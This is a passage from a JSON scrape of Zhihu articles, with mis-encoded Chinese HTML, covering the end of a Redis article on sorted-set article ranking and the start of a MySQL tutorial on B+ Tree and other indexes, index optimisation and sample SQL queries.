data-actualsrc=\"https://pic4.zhimg.com/v2-b02800d838d4e9d49f383b20d580bb73_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å¯¹æ–‡ç« è¿›è¡Œæ’åº</h2><p>ä¸ºäº†æŒ‰å‘å¸ƒæ—¶é—´å’Œç‚¹èµæ•°è¿›è¡Œæ’åºï¼Œå¯ä»¥å»ºç«‹ä¸€ä¸ªæ–‡ç« å‘å¸ƒæ—¶é—´çš„æœ‰åºé›†åˆå’Œä¸€ä¸ªæ–‡ç« ç‚¹èµæ•°çš„æœ‰åºé›†åˆã€‚ï¼ˆä¸‹å›¾ä¸­çš„ score å°±æ˜¯è¿™é‡Œæ‰€è¯´çš„ç‚¹èµæ•°ï¼›ä¸‹é¢æ‰€ç¤ºçš„æœ‰åºé›†åˆåˆ†å€¼å¹¶ä¸ç›´æ¥æ˜¯æ—¶é—´å’Œç‚¹èµæ•°ï¼Œè€Œæ˜¯æ ¹æ®æ—¶é—´å’Œç‚¹èµæ•°é—´æ¥è®¡ç®—å‡ºæ¥çš„ï¼‰</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-524a1c8ee8ff10e61c47269fab6034f0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"776\" data-rawheight=\"270\" class=\"origin_image zh-lightbox-thumb\" width=\"776\" data-original=\"https://pic1.zhimg.com/v2-524a1c8ee8ff10e61c47269fab6034f0_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;776&#39; height=&#39;270&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"776\" data-rawheight=\"270\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"776\" data-original=\"https://pic1.zhimg.com/v2-524a1c8ee8ff10e61c47269fab6034f0_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-524a1c8ee8ff10e61c47269fab6034f0_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å‚è€ƒèµ„æ–™</h2><ul><li>Carlson J L. Redis in Action[J]. Media.johnwiley.com.au, 2013.</li><li><a href=\"https://link.zhihu.com/?target=http%3A//redisbook.com/index.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">é»„å¥å®. Redis è®¾è®¡ä¸å®ç° [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2014.</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//redislabs.com/ebook/foreword/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">REDIS IN ACTION</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//ticki.github.io/blog/skip-lists-done-right/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Skip Lists: Done Right</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.cnblogs.com/loveincode/p/7411911.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">è®ºè¿° Redis å’Œ Memcached çš„å·®å¼‚</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//wiki.jikexueyuan.com/project/redis-guide\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Redis 3.0 ä¸­æ–‡ç‰ˆ- åˆ†ç‰‡</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.scienjus.com/redis-use-case/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Redis åº”ç”¨åœºæ™¯</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//redis.io/topics/lru-cache\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Using Redis as an LRU cache</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;899&#39; height=&#39;351&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "æ•°æ®åº“", 
                    "tagLink": "https://api.zhihu.com/topics/19552067"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68500693", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 2, 
            "title": "MySQL", 
            "content": "<p></p><h2>ä¸€ã€ç´¢å¼•</h2><h2>B+ Tree åŸç†</h2><h3>1. æ•°æ®ç»“æ„</h3><p>B Tree æŒ‡çš„æ˜¯ Balance Treeï¼Œä¹Ÿå°±æ˜¯å¹³è¡¡æ ‘ã€‚å¹³è¡¡æ ‘æ˜¯ä¸€é¢—æŸ¥æ‰¾æ ‘ï¼Œå¹¶ä¸”æ‰€æœ‰å¶å­èŠ‚ç‚¹ä½äºåŒä¸€å±‚ã€‚</p><p>B+ Tree æ˜¯åŸºäº B Tree å’Œå¶å­èŠ‚ç‚¹é¡ºåºè®¿é—®æŒ‡é’ˆè¿›è¡Œå®ç°ï¼Œå®ƒå…·æœ‰ B Tree çš„å¹³è¡¡æ€§ï¼Œå¹¶ä¸”é€šè¿‡é¡ºåºè®¿é—®æŒ‡é’ˆæ¥æé«˜åŒºé—´æŸ¥è¯¢çš„æ€§èƒ½ã€‚</p><p>åœ¨ B+ Tree ä¸­ï¼Œä¸€ä¸ªèŠ‚ç‚¹ä¸­çš„ key ä»å·¦åˆ°å³éé€’å‡æ’åˆ—ï¼Œå¦‚æœæŸä¸ªæŒ‡é’ˆçš„å·¦å³ç›¸é‚» key åˆ†åˆ«æ˜¯ keyi å’Œ keyi+1ï¼Œä¸”ä¸ä¸º nullï¼Œåˆ™è¯¥æŒ‡é’ˆæŒ‡å‘èŠ‚ç‚¹çš„æ‰€æœ‰ key å¤§äºç­‰äº keyi ä¸”å°äºç­‰äº keyi+1ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-944b25c93942b6166777920fd0c431b2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"571\" data-rawheight=\"289\" class=\"origin_image zh-lightbox-thumb\" width=\"571\" data-original=\"https://pic3.zhimg.com/v2-944b25c93942b6166777920fd0c431b2_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;571&#39; height=&#39;289&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"571\" data-rawheight=\"289\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"571\" data-original=\"https://pic3.zhimg.com/v2-944b25c93942b6166777920fd0c431b2_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-944b25c93942b6166777920fd0c431b2_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. æ“ä½œ</h3><p>è¿›è¡ŒæŸ¥æ‰¾æ“ä½œæ—¶ï¼Œé¦–å…ˆåœ¨æ ¹èŠ‚ç‚¹è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œæ‰¾åˆ°ä¸€ä¸ª key æ‰€åœ¨çš„æŒ‡é’ˆï¼Œç„¶åé€’å½’åœ°åœ¨æŒ‡é’ˆæ‰€æŒ‡å‘çš„èŠ‚ç‚¹è¿›è¡ŒæŸ¥æ‰¾ã€‚ç›´åˆ°æŸ¥æ‰¾åˆ°å¶å­èŠ‚ç‚¹ï¼Œç„¶ååœ¨å¶å­èŠ‚ç‚¹ä¸Šè¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œæ‰¾å‡º key æ‰€å¯¹åº”çš„ dataã€‚</p><p>æ’å…¥åˆ é™¤æ“ä½œä¼šç ´åå¹³è¡¡æ ‘çš„å¹³è¡¡æ€§ï¼Œå› æ­¤åœ¨æ’å…¥åˆ é™¤æ“ä½œä¹‹åï¼Œéœ€è¦å¯¹æ ‘è¿›è¡Œä¸€ä¸ªåˆ†è£‚ã€åˆå¹¶ã€æ—‹è½¬ç­‰æ“ä½œæ¥ç»´æŠ¤å¹³è¡¡æ€§ã€‚</p><h3>3. ä¸çº¢é»‘æ ‘çš„æ¯”è¾ƒ</h3><p>çº¢é»‘æ ‘ç­‰å¹³è¡¡æ ‘ä¹Ÿå¯ä»¥ç”¨æ¥å®ç°ç´¢å¼•ï¼Œä½†æ˜¯æ–‡ä»¶ç³»ç»ŸåŠæ•°æ®åº“ç³»ç»Ÿæ™®éé‡‡ç”¨ B+ Tree ä½œä¸ºç´¢å¼•ç»“æ„ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ä¸ªåŸå› ï¼š</p><p>ï¼ˆä¸€ï¼‰æ›´å°‘çš„æŸ¥æ‰¾æ¬¡æ•°</p><p>å¹³è¡¡æ ‘æŸ¥æ‰¾æ“ä½œçš„æ—¶é—´å¤æ‚åº¦å’Œæ ‘é«˜ h ç›¸å…³ï¼ŒO(h)=O(logdN)ï¼Œå…¶ä¸­ d ä¸ºæ¯ä¸ªèŠ‚ç‚¹çš„å‡ºåº¦ã€‚</p><p>çº¢é»‘æ ‘çš„å‡ºåº¦ä¸º 2ï¼Œè€Œ B+ Tree çš„å‡ºåº¦ä¸€èˆ¬éƒ½éå¸¸å¤§ï¼Œæ‰€ä»¥çº¢é»‘æ ‘çš„æ ‘é«˜ h å¾ˆæ˜æ˜¾æ¯” B+ Tree å¤§éå¸¸å¤šï¼ŒæŸ¥æ‰¾çš„æ¬¡æ•°ä¹Ÿå°±æ›´å¤šã€‚</p><p>ï¼ˆäºŒï¼‰åˆ©ç”¨ç£ç›˜é¢„è¯»ç‰¹æ€§</p><p>ä¸ºäº†å‡å°‘ç£ç›˜ I/O æ“ä½œï¼Œç£ç›˜å¾€å¾€ä¸æ˜¯ä¸¥æ ¼æŒ‰éœ€è¯»å–ï¼Œè€Œæ˜¯æ¯æ¬¡éƒ½ä¼šé¢„è¯»ã€‚é¢„è¯»è¿‡ç¨‹ä¸­ï¼Œç£ç›˜è¿›è¡Œé¡ºåºè¯»å–ï¼Œé¡ºåºè¯»å–ä¸éœ€è¦è¿›è¡Œç£ç›˜å¯»é“ï¼Œå¹¶ä¸”åªéœ€è¦å¾ˆçŸ­çš„ç£ç›˜æ—‹è½¬æ—¶é—´ï¼Œé€Ÿåº¦ä¼šéå¸¸å¿«ã€‚</p><p>æ“ä½œç³»ç»Ÿä¸€èˆ¬å°†å†…å­˜å’Œç£ç›˜åˆ†å‰²æˆå›ºå®šå¤§å°çš„å—ï¼Œæ¯ä¸€å—ç§°ä¸ºä¸€é¡µï¼Œå†…å­˜ä¸ç£ç›˜ä»¥é¡µä¸ºå•ä½äº¤æ¢æ•°æ®ã€‚æ•°æ®åº“ç³»ç»Ÿå°†ç´¢å¼•çš„ä¸€ä¸ªèŠ‚ç‚¹çš„å¤§å°è®¾ç½®ä¸ºé¡µçš„å¤§å°ï¼Œä½¿å¾—ä¸€æ¬¡ I/O å°±èƒ½å®Œå…¨è½½å…¥ä¸€ä¸ªèŠ‚ç‚¹ã€‚å¹¶ä¸”å¯ä»¥åˆ©ç”¨é¢„è¯»ç‰¹æ€§ï¼Œç›¸é‚»çš„èŠ‚ç‚¹ä¹Ÿèƒ½å¤Ÿè¢«é¢„å…ˆè½½å…¥ã€‚</p><h2>MySQL ç´¢å¼•</h2><p>ç´¢å¼•æ˜¯åœ¨å­˜å‚¨å¼•æ“å±‚å®ç°çš„ï¼Œè€Œä¸æ˜¯åœ¨æœåŠ¡å™¨å±‚å®ç°çš„ï¼Œæ‰€ä»¥ä¸åŒå­˜å‚¨å¼•æ“å…·æœ‰ä¸åŒçš„ç´¢å¼•ç±»å‹å’Œå®ç°ã€‚</p><h3>1. B+Tree ç´¢å¼•</h3><p>æ˜¯å¤§å¤šæ•° MySQL å­˜å‚¨å¼•æ“çš„é»˜è®¤ç´¢å¼•ç±»å‹ã€‚</p><p>å› ä¸ºä¸å†éœ€è¦è¿›è¡Œå…¨è¡¨æ‰«æï¼Œåªéœ€è¦å¯¹æ ‘è¿›è¡Œæœç´¢å³å¯ï¼Œæ‰€ä»¥æŸ¥æ‰¾é€Ÿåº¦å¿«å¾ˆå¤šã€‚</p><p>å› ä¸º B+ Tree çš„æœ‰åºæ€§ï¼Œæ‰€ä»¥é™¤äº†ç”¨äºæŸ¥æ‰¾ï¼Œè¿˜å¯ä»¥ç”¨äºæ’åºå’Œåˆ†ç»„ã€‚</p><p>å¯ä»¥æŒ‡å®šå¤šä¸ªåˆ—ä½œä¸ºç´¢å¼•åˆ—ï¼Œå¤šä¸ªç´¢å¼•åˆ—å…±åŒç»„æˆé”®ã€‚</p><p>é€‚ç”¨äºå…¨é”®å€¼ã€é”®å€¼èŒƒå›´å’Œé”®å‰ç¼€æŸ¥æ‰¾ï¼Œå…¶ä¸­é”®å‰ç¼€æŸ¥æ‰¾åªé€‚ç”¨äºæœ€å·¦å‰ç¼€æŸ¥æ‰¾ã€‚å¦‚æœä¸æ˜¯æŒ‰ç…§ç´¢å¼•åˆ—çš„é¡ºåºè¿›è¡ŒæŸ¥æ‰¾ï¼Œåˆ™æ— æ³•ä½¿ç”¨ç´¢å¼•ã€‚</p><p>InnoDB çš„ B+Tree ç´¢å¼•åˆ†ä¸ºä¸»ç´¢å¼•å’Œè¾…åŠ©ç´¢å¼•ã€‚ä¸»ç´¢å¼•çš„å¶å­èŠ‚ç‚¹ data åŸŸè®°å½•ç€å®Œæ•´çš„æ•°æ®è®°å½•ï¼Œè¿™ç§ç´¢å¼•æ–¹å¼è¢«ç§°ä¸ºèšç°‡ç´¢å¼•ã€‚å› ä¸ºæ— æ³•æŠŠæ•°æ®è¡Œå­˜æ”¾åœ¨ä¸¤ä¸ªä¸åŒçš„åœ°æ–¹ï¼Œæ‰€ä»¥ä¸€ä¸ªè¡¨åªèƒ½æœ‰ä¸€ä¸ªèšç°‡ç´¢å¼•ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-ab0c51a5759a7afcb54c78e922baa744_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"621\" data-rawheight=\"335\" class=\"origin_image zh-lightbox-thumb\" width=\"621\" data-original=\"https://pic1.zhimg.com/v2-ab0c51a5759a7afcb54c78e922baa744_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;621&#39; height=&#39;335&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"621\" data-rawheight=\"335\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"621\" data-original=\"https://pic1.zhimg.com/v2-ab0c51a5759a7afcb54c78e922baa744_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-ab0c51a5759a7afcb54c78e922baa744_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>è¾…åŠ©ç´¢å¼•çš„å¶å­èŠ‚ç‚¹çš„ data åŸŸè®°å½•ç€ä¸»é”®çš„å€¼ï¼Œå› æ­¤åœ¨ä½¿ç”¨è¾…åŠ©ç´¢å¼•è¿›è¡ŒæŸ¥æ‰¾æ—¶ï¼Œéœ€è¦å…ˆæŸ¥æ‰¾åˆ°ä¸»é”®å€¼ï¼Œç„¶åå†åˆ°ä¸»ç´¢å¼•ä¸­è¿›è¡ŒæŸ¥æ‰¾ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-946a02e2a1ecb5df71ac6f776bc1c8bb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"584\" data-rawheight=\"288\" class=\"origin_image zh-lightbox-thumb\" width=\"584\" data-original=\"https://pic4.zhimg.com/v2-946a02e2a1ecb5df71ac6f776bc1c8bb_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;584&#39; height=&#39;288&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"584\" data-rawheight=\"288\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"584\" data-original=\"https://pic4.zhimg.com/v2-946a02e2a1ecb5df71ac6f776bc1c8bb_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-946a02e2a1ecb5df71ac6f776bc1c8bb_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. å“ˆå¸Œç´¢å¼•</h3><p>å“ˆå¸Œç´¢å¼•èƒ½ä»¥ O(1) æ—¶é—´è¿›è¡ŒæŸ¥æ‰¾ï¼Œä½†æ˜¯å¤±å»äº†æœ‰åºæ€§ï¼š</p><ul><li>æ— æ³•ç”¨äºæ’åºä¸åˆ†ç»„ï¼›</li><li>åªæ”¯æŒç²¾ç¡®æŸ¥æ‰¾ï¼Œæ— æ³•ç”¨äºéƒ¨åˆ†æŸ¥æ‰¾å’ŒèŒƒå›´æŸ¥æ‰¾ã€‚</li></ul><p>InnoDB å­˜å‚¨å¼•æ“æœ‰ä¸€ä¸ªç‰¹æ®Šçš„åŠŸèƒ½å«â€œè‡ªé€‚åº”å“ˆå¸Œç´¢å¼•â€ï¼Œå½“æŸä¸ªç´¢å¼•å€¼è¢«ä½¿ç”¨çš„éå¸¸é¢‘ç¹æ—¶ï¼Œä¼šåœ¨ B+Tree ç´¢å¼•ä¹‹ä¸Šå†åˆ›å»ºä¸€ä¸ªå“ˆå¸Œç´¢å¼•ï¼Œè¿™æ ·å°±è®© B+Tree ç´¢å¼•å…·æœ‰å“ˆå¸Œç´¢å¼•çš„ä¸€äº›ä¼˜ç‚¹ï¼Œæ¯”å¦‚å¿«é€Ÿçš„å“ˆå¸ŒæŸ¥æ‰¾ã€‚</p><h3>3. å…¨æ–‡ç´¢å¼•</h3><p>MyISAM å­˜å‚¨å¼•æ“æ”¯æŒå…¨æ–‡ç´¢å¼•ï¼Œç”¨äºæŸ¥æ‰¾æ–‡æœ¬ä¸­çš„å…³é”®è¯ï¼Œè€Œä¸æ˜¯ç›´æ¥æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ã€‚</p><p>æŸ¥æ‰¾æ¡ä»¶ä½¿ç”¨ MATCH AGAINSTï¼Œè€Œä¸æ˜¯æ™®é€šçš„ WHEREã€‚</p><p>å…¨æ–‡ç´¢å¼•ä½¿ç”¨å€’æ’ç´¢å¼•å®ç°ï¼Œå®ƒè®°å½•ç€å…³é”®è¯åˆ°å…¶æ‰€åœ¨æ–‡æ¡£çš„æ˜ å°„ã€‚</p><p>InnoDB å­˜å‚¨å¼•æ“åœ¨ MySQL 5.6.4 ç‰ˆæœ¬ä¸­ä¹Ÿå¼€å§‹æ”¯æŒå…¨æ–‡ç´¢å¼•ã€‚</p><h3>4. ç©ºé—´æ•°æ®ç´¢å¼•</h3><p>MyISAM å­˜å‚¨å¼•æ“æ”¯æŒç©ºé—´æ•°æ®ç´¢å¼•ï¼ˆR-Treeï¼‰ï¼Œå¯ä»¥ç”¨äºåœ°ç†æ•°æ®å­˜å‚¨ã€‚ç©ºé—´æ•°æ®ç´¢å¼•ä¼šä»æ‰€æœ‰ç»´åº¦æ¥ç´¢å¼•æ•°æ®ï¼Œå¯ä»¥æœ‰æ•ˆåœ°ä½¿ç”¨ä»»æ„ç»´åº¦æ¥è¿›è¡Œç»„åˆæŸ¥è¯¢ã€‚</p><p>å¿…é¡»ä½¿ç”¨ GIS ç›¸å…³çš„å‡½æ•°æ¥ç»´æŠ¤æ•°æ®ã€‚</p><h2>ç´¢å¼•ä¼˜åŒ–</h2><h3>1. ç‹¬ç«‹çš„åˆ—</h3><p>åœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç´¢å¼•åˆ—ä¸èƒ½æ˜¯è¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿä¸èƒ½æ˜¯å‡½æ•°çš„å‚æ•°ï¼Œå¦åˆ™æ— æ³•ä½¿ç”¨ç´¢å¼•ã€‚</p><p>ä¾‹å¦‚ä¸‹é¢çš„æŸ¥è¯¢ä¸èƒ½ä½¿ç”¨ actor_id åˆ—çš„ç´¢å¼•ï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">actor_id</span> <span class=\"k\">FROM</span> <span class=\"n\">sakila</span><span class=\"p\">.</span><span class=\"n\">actor</span> <span class=\"k\">WHERE</span> <span class=\"n\">actor_id</span> <span class=\"o\">+</span> <span class=\"mi\">1</span> <span class=\"o\">=</span> <span class=\"mi\">5</span><span class=\"p\">;</span></code></pre></div><h3>2. å¤šåˆ—ç´¢å¼•</h3><p>åœ¨éœ€è¦ä½¿ç”¨å¤šä¸ªåˆ—ä½œä¸ºæ¡ä»¶è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œä½¿ç”¨å¤šåˆ—ç´¢å¼•æ¯”ä½¿ç”¨å¤šä¸ªå•åˆ—ç´¢å¼•æ€§èƒ½æ›´å¥½ã€‚ä¾‹å¦‚ä¸‹é¢çš„è¯­å¥ä¸­ï¼Œæœ€å¥½æŠŠ actor_id å’Œ film_id è®¾ç½®ä¸ºå¤šåˆ—ç´¢å¼•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"n\">film_id</span><span class=\"p\">,</span> <span class=\"n\">actor_</span> <span class=\"n\">id</span> <span class=\"k\">FROM</span> <span class=\"n\">sakila</span><span class=\"p\">.</span><span class=\"n\">film_actor</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">actor_id</span> <span class=\"o\">=</span> <span class=\"mi\">1</span> <span class=\"k\">AND</span> <span class=\"n\">film_id</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span></code></pre></div><h3>3. ç´¢å¼•åˆ—çš„é¡ºåº</h3><p>è®©é€‰æ‹©æ€§æœ€å¼ºçš„ç´¢å¼•åˆ—æ”¾åœ¨å‰é¢ã€‚</p><p>ç´¢å¼•çš„é€‰æ‹©æ€§æ˜¯æŒ‡ï¼šä¸é‡å¤çš„ç´¢å¼•å€¼å’Œè®°å½•æ€»æ•°çš„æ¯”å€¼ã€‚æœ€å¤§å€¼ä¸º 1ï¼Œæ­¤æ—¶æ¯ä¸ªè®°å½•éƒ½æœ‰å”¯ä¸€çš„ç´¢å¼•ä¸å…¶å¯¹åº”ã€‚é€‰æ‹©æ€§è¶Šé«˜ï¼Œæ¯ä¸ªè®°å½•çš„åŒºåˆ†åº¦è¶Šé«˜ï¼ŒæŸ¥è¯¢æ•ˆç‡ä¹Ÿè¶Šé«˜ã€‚</p><p>ä¾‹å¦‚ä¸‹é¢æ˜¾ç¤ºçš„ç»“æœä¸­ customer_id çš„é€‰æ‹©æ€§æ¯” staff_id æ›´é«˜ï¼Œå› æ­¤æœ€å¥½æŠŠ customer_id åˆ—æ”¾åœ¨å¤šåˆ—ç´¢å¼•çš„å‰é¢ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"k\">COUNT</span><span class=\"p\">(</span><span class=\"k\">DISTINCT</span> <span class=\"n\">staff_id</span><span class=\"p\">)</span><span class=\"o\">/</span><span class=\"k\">COUNT</span><span class=\"p\">(</span><span class=\"o\">*</span><span class=\"p\">)</span> <span class=\"k\">AS</span> <span class=\"n\">staff_id_selectivity</span><span class=\"p\">,</span>\n<span class=\"k\">COUNT</span><span class=\"p\">(</span><span class=\"k\">DISTINCT</span> <span class=\"n\">customer_id</span><span class=\"p\">)</span><span class=\"o\">/</span><span class=\"k\">COUNT</span><span class=\"p\">(</span><span class=\"o\">*</span><span class=\"p\">)</span> <span class=\"k\">AS</span> <span class=\"n\">customer_id_selectivity</span><span class=\"p\">,</span>\n<span class=\"k\">COUNT</span><span class=\"p\">(</span><span class=\"o\">*</span><span class=\"p\">)</span>\n<span class=\"k\">FROM</span> <span class=\"n\">payment</span><span class=\"p\">;</span>\n<span class=\"n\">staff_id_selectivity</span><span class=\"p\">:</span> <span class=\"mi\">0</span><span class=\"p\">.</span><span class=\"mi\">0001</span>\n<span class=\"n\">customer_id_selectivity</span><span class=\"p\">:</span> <span class=\"mi\">0</span><span class=\"p\">.</span><span class=\"mi\">0373</span>\n               <span class=\"k\">COUNT</span><span class=\"p\">(</span><span class=\"o\">*</span><span class=\"p\">):</span> <span class=\"mi\">16049</span></code></pre></div><h3>4. å‰ç¼€ç´¢å¼•</h3><p>å¯¹äº BLOBã€TEXT å’Œ VARCHAR ç±»å‹çš„åˆ—ï¼Œå¿…é¡»ä½¿ç”¨å‰ç¼€ç´¢å¼•ï¼Œåªç´¢å¼•å¼€å§‹çš„éƒ¨åˆ†å­—ç¬¦ã€‚</p><p>å‰ç¼€é•¿åº¦çš„é€‰å–éœ€è¦æ ¹æ®ç´¢å¼•é€‰æ‹©æ€§æ¥ç¡®å®šã€‚</p><h3>5. è¦†ç›–ç´¢å¼•</h3><p>ç´¢å¼•åŒ…å«æ‰€æœ‰éœ€è¦æŸ¥è¯¢çš„å­—æ®µçš„å€¼ã€‚</p><p>å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š</p><ul><li>ç´¢å¼•é€šå¸¸è¿œå°äºæ•°æ®è¡Œçš„å¤§å°ï¼Œåªè¯»å–ç´¢å¼•èƒ½å¤§å¤§å‡å°‘æ•°æ®è®¿é—®é‡ã€‚</li><li>ä¸€äº›å­˜å‚¨å¼•æ“ï¼ˆä¾‹å¦‚ MyISAMï¼‰åœ¨å†…å­˜ä¸­åªç¼“å­˜ç´¢å¼•ï¼Œè€Œæ•°æ®ä¾èµ–äºæ“ä½œç³»ç»Ÿæ¥ç¼“å­˜ã€‚å› æ­¤ï¼Œåªè®¿é—®ç´¢å¼•å¯ä»¥ä¸ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ï¼ˆé€šå¸¸æ¯”è¾ƒè´¹æ—¶ï¼‰ã€‚</li><li>å¯¹äº InnoDB å¼•æ“ï¼Œè‹¥è¾…åŠ©ç´¢å¼•èƒ½å¤Ÿè¦†ç›–æŸ¥è¯¢ï¼Œåˆ™æ— éœ€è®¿é—®ä¸»ç´¢å¼•ã€‚</li></ul><h2>ç´¢å¼•çš„ä¼˜ç‚¹</h2><ul><li> å¤§å¤§å‡å°‘äº†æœåŠ¡å™¨éœ€è¦æ‰«æçš„æ•°æ®è¡Œæ•°ã€‚<br/> </li><li> å¸®åŠ©æœåŠ¡å™¨é¿å…è¿›è¡Œæ’åºå’Œåˆ†ç»„ï¼Œä»¥åŠé¿å…åˆ›å»ºä¸´æ—¶è¡¨ï¼ˆB+Tree ç´¢å¼•æ˜¯æœ‰åºçš„ï¼Œå¯ä»¥ç”¨äº ORDER BY å’Œ GROUP BY æ“ä½œã€‚ä¸´æ—¶è¡¨ä¸»è¦æ˜¯åœ¨æ’åºå’Œåˆ†ç»„è¿‡ç¨‹ä¸­åˆ›å»ºï¼Œä¸éœ€è¦æ’åºå’Œåˆ†ç»„ï¼Œä¹Ÿå°±ä¸éœ€è¦åˆ›å»ºä¸´æ—¶è¡¨ï¼‰ã€‚<br/> </li><li> å°†éšæœº I/O å˜ä¸ºé¡ºåº I/Oï¼ˆB+Tree ç´¢å¼•æ˜¯æœ‰åºçš„ï¼Œä¼šå°†ç›¸é‚»çš„æ•°æ®éƒ½å­˜å‚¨åœ¨ä¸€èµ·ï¼‰ã€‚<br/> </li></ul><h2>ç´¢å¼•çš„ä½¿ç”¨æ¡ä»¶</h2><ul><li> å¯¹äºéå¸¸å°çš„è¡¨ã€å¤§éƒ¨åˆ†æƒ…å†µä¸‹ç®€å•çš„å…¨è¡¨æ‰«ææ¯”å»ºç«‹ç´¢å¼•æ›´é«˜æ•ˆï¼›<br/> </li><li> å¯¹äºä¸­åˆ°å¤§å‹çš„è¡¨ï¼Œç´¢å¼•å°±éå¸¸æœ‰æ•ˆï¼›<br/> </li><li> ä½†æ˜¯å¯¹äºç‰¹å¤§å‹çš„è¡¨ï¼Œå»ºç«‹å’Œç»´æŠ¤ç´¢å¼•çš„ä»£ä»·å°†ä¼šéšä¹‹å¢é•¿ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦ç”¨åˆ°ä¸€ç§æŠ€æœ¯å¯ä»¥ç›´æ¥åŒºåˆ†å‡ºéœ€è¦æŸ¥è¯¢çš„ä¸€ç»„æ•°æ®ï¼Œè€Œä¸æ˜¯ä¸€æ¡è®°å½•ä¸€æ¡è®°å½•åœ°åŒ¹é…ï¼Œä¾‹å¦‚å¯ä»¥ä½¿ç”¨åˆ†åŒºæŠ€æœ¯ã€‚<br/> </li></ul><h2>äºŒã€æŸ¥è¯¢æ€§èƒ½ä¼˜åŒ–</h2><h2>ä½¿ç”¨ Explain è¿›è¡Œåˆ†æ</h2><p>Explain 